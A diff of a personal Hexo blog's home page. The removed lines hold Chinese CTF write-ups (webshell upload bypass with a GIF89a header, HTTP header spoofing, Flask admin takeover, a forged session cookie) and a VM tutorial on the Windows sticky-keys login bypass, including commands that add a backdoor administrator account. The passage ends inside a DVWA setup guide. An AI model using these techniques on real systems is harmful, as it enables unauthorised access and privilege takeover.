@@ -1,1228 +1,216 @@
-<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+<!doctype html>
 <html lang="en">
+
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+<script type="text/javascript" 
+src="//cdnjs.cloudflare.com/ajax/libs/prettify/r298/prettify.min.js">
+</script>
+<link href=  "/plugins/code-theme/tomorrow.css" type="text/css" rel="stylesheet" />
+<link rel="stylesheet" href="/plugins/github-markdown.css">
+
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 4.2.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
-
-
-<script id="hexo-configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    hostname: new URL('http://moMaxX.github.io').hostname,
-    root: '/',
-    scheme: 'Muse',
-    version: '7.7.1',
-    exturl: false,
-    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
-    copycode: {"enable":false,"show_result":false,"style":null},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
-    bookmark: {"enable":false,"color":"#222","save":"auto"},
-    fancybox: false,
-    mediumzoom: false,
-    lazyload: false,
-    pangu: false,
-    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
-    algolia: {
-      appID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    },
-    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
-    path: 'search.xml',
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
-  };
-</script>
-
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Momax&#39;s blog">
-<meta property="og:url" content="http://momaxx.github.io/index.html">
-<meta property="og:site_name" content="Momax&#39;s blog">
-<meta property="og:locale" content="en_US">
-<meta property="article:author" content="moMaxX">
-<meta name="twitter:card" content="summary">
-
-<link rel="canonical" href="http://momaxx.github.io/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: true,
-    isPost: false
-  };
-</script>
-
-  <title>Momax's blog</title>
+  <meta charset="UTF-8" name="viewport" content="width=device-width,initial-scale=1">
   
+    
+    
+      <link rel="stylesheet" href="/css/legend.css">
+    
+  
+<meta name="generator" content="Hexo 4.2.0"></head>
 
+<body id="body-home-bg">
+<div id="layout-content">
+  <div id="menu-outer-home">
+  <div id="menu-inner">
+    
+    
+    <div id="site-title">
+      Momax's blog
+    </div>
+    
 
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-meta">
-
+     
     <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Momax's blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+    
+      
+      <a href="/">首页</a>
+      
+    
+      
+      <a href="/archives">归档</a>
+      
+    
     </div>
   </div>
+</div> 
+  <div id="content-outer">
+    <div id="content-inner">
+      
+      
+  
 
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
+<video id="bgvideo" autoplay playsinline loop poster=/images/background.png>
+  <source src=http://cdn.calm.com/scenes/scene-Qqkzy9k7Eo.mp4?v=1418162238190 type="video/mp4">
+</video>
+
+
+
+
+  <div id="play-button" >
+  <img id="play-img" src="/images/playback_play.png"></img>
 </div>
-
-
-<nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
-
-  </li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
-        </a>
-      </li>
-  </ul>
-
-</nav>
-  <div class="site-search">
-    <div class="popup search-popup">
-    <div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="none"
-           placeholder="Searching..." spellcheck="false"
-           type="text" id="search-input">
-  </div>
-  <span class="popup-btn-close">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div id="search-result"></div>
-
-</div>
-<div class="search-pop-overlay"></div>
-
-  </div>
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content">
-            
-
-  <div class="posts-expand">
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://momaxx.github.io/2020/11/29/buu%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%80%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="moMaxX">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Momax's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/11/29/buu%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">buu学习之旅（一）</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2020-11-29 00:36:22 / Modified: 00:36:29" itemprop="dateCreated datePublished" datetime="2020-11-29T00:36:22+08:00">2020-11-29</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>@<a href="buu学习之旅">TOC</a></p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>许久没刷buu的题了，这次的我又双叒叕来了！（别问为什么来了，问就是水题来了）</p>
-<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="自闭一-upload1"><a href="#自闭一-upload1" class="headerlink" title="自闭一 upload1"></a>自闭一 upload1</h2><p>打开题目<br><img src="https://img-blog.csdnimg.cn/20201123204056410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="题目场景"><br>然后一看这不是有手就行吗？自己想了一下他的目录，猜测是<code>upload</code>，因为在源码里看到了类似的东西。所以尝试了一下，结果还真的对了。<img src="https://img-blog.csdnimg.cn/20201123204215432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="upload目录"><br>接下来就是上传后门文件了。所以首先尝试正常的来了一个<br><img src="https://img-blog.csdnimg.cn/20201123204357622.png#pic_center" alt="第一次"><br>发现结果提示<img src="https://img-blog.csdnimg.cn/2020112320443029.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="第一次提示"><br>然后该文件格式，接着尝试发现不对<img src="https://img-blog.csdnimg.cn/20201123204521965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="第二次尝试结果"><br>所以，这是过滤了字符？<br>于是就直接改了一下，变为<img src="https://img-blog.csdnimg.cn/20201123204611479.png#pic_center" alt="第一次修改之后"><br>接着上传<img src="https://img-blog.csdnimg.cn/20201123204648360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="结果"><br>然后就是想了一下，结合网上的一些大师傅的经验（也就是类似提醒的wp），知道了一种新的文件上传的方式，叫做<code>文件幻术头</code>，也就是在你写的一句话前面加上一个图片类型的文件头，然后接着百度发现只需要在前面加一个<code>GIF89a</code>就可以，所以进行尝试<br><img src="https://img-blog.csdnimg.cn/2020112320494427.png#pic_center" alt="GIF文件头"><br><img src="https://img-blog.csdnimg.cn/20201123205643614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="上传结果"><br>上传成功。<br>然后路径就是upload后面跟文件名。<br>接下来就bp抓包<img src="https://img-blog.csdnimg.cn/20201123205742557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="结果"><br>修改文件后缀为<code>phtml</code>，（至于为什么不选择php等，在我尝试后发现会报错，应该存在过滤的）接着蚁剑连接，搜索flag得到结果<br><img src="https://img-blog.csdnimg.cn/20201123205918872.png#pic_center" alt="flag"></p>
-<h2 id="自闭二-HTTP"><a href="#自闭二-HTTP" class="headerlink" title="自闭二 HTTP"></a>自闭二 HTTP</h2><p>打开题目，<img src="https://img-blog.csdnimg.cn/20201124200145250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="题目样式"><br>看到这里直接鼠标右键查看源码，发现了一个<code>.php</code>文件，<br><img src="https://img-blog.csdnimg.cn/20201124200247169.png#pic_center" alt=".php文件"><br>访问之后发现<img src="https://img-blog.csdnimg.cn/20201124200311740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="访问之后"><br>花里胡哨的一大堆没用，看到提示意思是说这个请求不是<code>https://www.Sycsecret.com</code>发出的。所以就直接抓包，修改头信息。<br><img src="https://img-blog.csdnimg.cn/20201124200507265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="修改第一次"><br>添加<code>referer</code>信息<br><img src="https://img-blog.csdnimg.cn/20201124200538239.png#pic_center" alt="修改第二次"><br>这里提示使用<code>Syclover</code>进行浏览，所以再次修改<img src="https://img-blog.csdnimg.cn/20201124200622810.png#pic_center" alt="第三次"><br>得到<br><img src="https://img-blog.csdnimg.cn/20201124200639533.png#pic_center" alt="第三次结果"><br>提示只能本地访问，所以<code>xff</code>信息改为：<code>127.0.0.1</code>，访问得到flag<br><img src="https://img-blog.csdnimg.cn/20201124200736709.png#pic_center" alt="flag"></p>
-<h2 id="自闭三-admin"><a href="#自闭三-admin" class="headerlink" title="自闭三 admin"></a>自闭三 admin</h2><p>打开题目，上面提示<img src="https://img-blog.csdnimg.cn/20201124202003787.png#pic_center" alt="提示"><br>给我吓了一跳，就打开吧，然后进去<img src="https://img-blog.csdnimg.cn/20201124202039297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="题目"><br>因为题目名字是admin，所以我就尝试了一下admin+123登录，结果，就很，<img src="https://img-blog.csdnimg.cn/20201124202125919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="flag "><br>WHAT?!!!!我还没开始就已经结束了？这，果然是最快的男人(tui)，既然这样就按照正常步骤解一下吧，刚开始想着会不会是密码蛮力爆破，然后没尝试，因为buu存在请求次数。所以就换了一个思路。<br>正常注册了一个账号，然后进入修改密码的页面(因为之前在登陆页面找了没有，就来到了密码修改页面)，发现了注释的网页链接<code>&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</code>，所以百度该链接,直接得到了这个题目的源码，然后找到这个东西<img src="https://img-blog.csdnimg.cn/20201124203828263.png#pic_center" alt="发现"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">       name = strlower(form.username.data)</span><br></pre></td></tr></table></figure>
-<p>进行了名字的小写转换，也就是说注册的是大写会自动转换成小写，所以就无法通过注册大写admin来操作了。接着在登录，注册，修改页面都发现了这个函数。但是这个函数并不是python自带的，而是作者自己定义的，看一下作者定义这个函数的地方。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span>:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>
-<p>使用的是 <code>nodeprep.prepare函数</code>，这个函数是用<code>Twisted</code>模块导入，而且查看项目时发现这个项目的<code>Twisted版本</code>相对于当时题目发布的时间是落后的，所以这里肯定有问题。<br>就利用Unicode编码转换。<br><a href="https://unicode-table.com/en/1D2E/" target="_blank" rel="noopener">这里有一个在线网站</a><br>可以自动生成需要的字符。<br>也就是说这个自定义函数的工作流程就是</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴬdmin-&gt;Admin-&gt;admin</span><br></pre></td></tr></table></figure>
-<p>所以注册之后，修改密码，直接用a<code>dmin+修改之后的密码</code>进行登录，得到flag。<br>然后看了大师傅的博客之后发现还有另外两种解题方法。</p>
-<h3 id="session伪造"><a href="#session伪造" class="headerlink" title="session伪造"></a>session伪造</h3><p>这方面由于自身并不强，所以没办法进行详细的解释。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">由于这个题现在知道了是利用flask，所以就直接百度了解了一下flask的一些原理，</span><br><span class="line">知道了flask是把session存在客户端的，而且只经过base64编码和用密钥签名，虽然没有签名不可以伪造session，但是有很多信息我们可以直接从session解码找出来。</span><br></pre></td></tr></table></figure>
-<p>然后就随便注册了一个账户登录接着利用bp抓包，</p>
-<p><img src="https://img-blog.csdnimg.cn/20201124205938923.png#pic_center" alt="登录抓包"><br>发现session值，利用了base64加密。<br>然后就利用脚本解密，得到<img src="https://img-blog.csdnimg.cn/20201129002633908.png" alt="解密"><br>然后就把其中的name项修改为admin再进行加密。得到<br><img src="https://img-blog.csdnimg.cn/202011290030193.png" alt="加密"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJw9kEGLwjAQhf_KMmcPtraXggclWlyYlCypJbmI2mqSdtylKlsj_vfNuounYd6Dj_feHTaHvjkbyC79tRnBxtaQ3eFtBxlwtja8Kr<span class="number">-1</span>w0j5WaQZppy9W0281bTulBRDIeeOs9VEu9oUOUYFK1N0xqhKxEX<span class="number">-0</span>SppLNK_zpadll2LFe_QL0lRmWCsLSecFLK22i0JpUgxFgPPy1jL2cDlPkaHN12VN6yC7rVBf0y4rA33q_AvEuXVFB4j2J_7w-by2TanV4UQ-YZMjNGrMWdluHPCfE0hPqGbW52LKKAT7n4rqFTTIsHZ9ImztD02L1KTf9md-HNOWwoGbGuyJxjB9dz0z90gGsPjB_2NbJ4.X8J7Cg.NQcbminT5MN3zUM9NApKSNakd58</span><br></pre></td></tr></table></figure>
-<p>然后用这个替换掉抓包时的cookie值<img src="https://img-blog.csdnimg.cn/20201129003207759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="得到flag"></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>初次了解到<code>session伪造</code>，感觉就很神奇，有点那种csrf漏洞攻击的味道，同样是利用cookie而不是进行攻击。等下次研究一下<code>flask</code>再详细的记录下来</p>
-<h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p>博客水完了，但是在水的同时同样感受到了自己知识上的不足，已经对于做题方面的不老到，这些有待于提高。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://momaxx.github.io/2020/11/28/%E5%88%A9%E7%94%A8shift%E8%BF%9E%E7%82%B9%E4%BA%94%E6%AC%A1%E8%BF%9B%E5%85%A5%E7%94%B5%E8%84%91/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="moMaxX">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Momax's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/11/28/%E5%88%A9%E7%94%A8shift%E8%BF%9E%E7%82%B9%E4%BA%94%E6%AC%A1%E8%BF%9B%E5%85%A5%E7%94%B5%E8%84%91/" class="post-title-link" itemprop="url">利用shift连点五次进入电脑</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2020-11-28 00:33:04 / Modified: 00:33:11" itemprop="dateCreated datePublished" datetime="2020-11-28T00:33:04+08:00">2020-11-28</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>@<a href="利用五次shift连点绕过用户进入电脑">TOC</a></p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>才发现，我的博客还没水呢，于是就趁着没事干，来水一篇</p>
-<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>所谓的利用这个漏洞，就是说电脑有一个连按五次shift会出现一个快捷粘贴功能。然后电脑在非正常关机时再次开机会出现修复模式，然后利用这个进入文件目录，修改五次shift之后调出来的cmd窗口，达到自己的目的。因为这时没有输入用户登录，所以系统默认的是以最高权限打开的cmd窗口。</p>
-<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>设备：vm工具，Windows 7系统。<br>准备：打开连点五次shift启用快速粘贴功能。<code>具体操作：控制面板-&gt;轻松使用中心-&gt;使键盘更易于使用，然后找到功能打开</code>。<br>实验前准备：拍摄虚拟机的快照，防止因意外操作使系统崩溃。</p>
-<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><h3 id="非正常关机"><a href="#非正常关机" class="headerlink" title="非正常关机"></a>非正常关机</h3><p>在计算机开机过程中进行强制关机，<code>具体操作：电源键-&gt;关闭</code>。</p>
-<h3 id="再次开机"><a href="#再次开机" class="headerlink" title="再次开机"></a>再次开机</h3><p>这时提示非正常关机，然乎选择推荐项<br><img src="https://img-blog.csdnimg.cn/20201128001428856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="非正常启动页面"><br>进入推荐项</p>
-<h3 id="进入系统目录，并执行相关的操作"><a href="#进入系统目录，并执行相关的操作" class="headerlink" title="进入系统目录，并执行相关的操作"></a>进入系统目录，并执行相关的操作</h3><p>在这里选择<code>取消系统还原</code>，<br><img src="https://img-blog.csdnimg.cn/20201128001552365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="取消系统还原"><br><img src="https://img-blog.csdnimg.cn/20201128001940294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="截图"><br>记得点击第二个，用来打开本地文件目录。<br><img src="https://img-blog.csdnimg.cn/20201128002034258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="文件效果"><br>然后进入文件目录下之后，进入<code>window-&gt;system32</code>找到<code>cmd和sethc</code>将sethc修改一下名字，随便起，然乎复制cmd为sethc文件，接着重启。<br>连按五次shift此时会以最高权限进入cmd窗口。<br><img src="https://img-blog.csdnimg.cn/20201128002252284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="cmd窗口"><br>然后就可以执行操作了，比如说我创建一个新的用户，并把它提一下权限。<br>所以说可以执行命令：<code>net user hack &#39;123456&#39;   
-net localgroup administrators hack /add</code><br>来实现创建一个新的用户并进行登录。此时再重启电脑，就会发现多了一个用户<br><img src="https://img-blog.csdnimg.cn/20201128002553676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="最终效果"></p>
-<h2 id="漏洞解决方法"><a href="#漏洞解决方法" class="headerlink" title="漏洞解决方法"></a>漏洞解决方法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一、关闭相关的功能。</span><br><span class="line">二、在官网上下载一个补丁或者把系统更新到没有这个漏洞的版本。</span><br></pre></td></tr></table></figure>
-<h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>其实这个漏洞的话，不止可以干些这种的事，毕竟已经进入了最高权限了当时，也就可以在其中留一些奇妙的东西啥了也不是不行。但是这东西就自己靶机复现算了，别的事就像一下吧。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://momaxx.github.io/2020/11/18/DVWA%E9%9D%B6%E5%9C%BA%E4%B9%8B%E8%9B%AE%E5%8A%9B%E6%94%BB%E5%87%BB%E4%B8%89%E7%A7%8D%E7%AD%89%E7%BA%A7%E8%A7%A3%E6%9E%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="moMaxX">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Momax's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/11/18/DVWA%E9%9D%B6%E5%9C%BA%E4%B9%8B%E8%9B%AE%E5%8A%9B%E6%94%BB%E5%87%BB%E4%B8%89%E7%A7%8D%E7%AD%89%E7%BA%A7%E8%A7%A3%E6%9E%90/" class="post-title-link" itemprop="url">DVWA靶场之蛮力攻击三种等级解析</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2020-11-18 23:08:12 / Modified: 23:07:41" itemprop="dateCreated datePublished" datetime="2020-11-18T23:08:12+08:00">2020-11-18</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p> @<a href="DVWA">TOC</a></p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>闲来无事，刷各大平台的题刷的有点头昏，就来换了个菜，这才发现我是真的菜！！！</p>
-<h1 id="DVWA简介"><a href="#DVWA简介" class="headerlink" title="DVWA简介"></a>DVWA简介</h1><p>DVWA是一款渗透平台，类似于网络安全员的渗透小游戏<br>DVWA是一个Web应用程序，需要安装在Web服务器上，并需要MySQL数据库支持</p>
-<h1 id="DVWA搭建"><a href="#DVWA搭建" class="headerlink" title="DVWA搭建"></a>DVWA搭建</h1><p>这里用的是phpstudy集成环境<br>启动软件，打开MySQL和apache。<img src="https://img-blog.csdnimg.cn/20201018141156221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><p>这里是在Windows环境下配置安装的DVWA。用了phpstudy集成环境</p>
-<h2 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h2><p>一、官网下载DVWA：<code>http://www.dvwa.co.uk/</code><br>下载zip压缩包，解压到<strong>phpstudy</strong>的<code>WWW</code>的文件目录下。<br>二、然后找到文件<code>config.inc.php.dist</code>重命名为<code>config.inc.php</code>，然后打开编辑，找到图示位置，修改账号密码。<br><img src="https://img-blog.csdnimg.cn/20201018142721382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>默认账号密码是root。<br>三、浏览器搜索打开<code>http://127.0.0.1/DVWA/setup.php</code>，进行DVWA的安装。<br><img src="https://img-blog.csdnimg.cn/20201018143218142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后点击最下方的按钮。<br>四、跳转到登录界面。默认账号密码是<code>admin、password</code>。登录进去<br><img src="https://img-blog.csdnimg.cn/2020101814385969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" 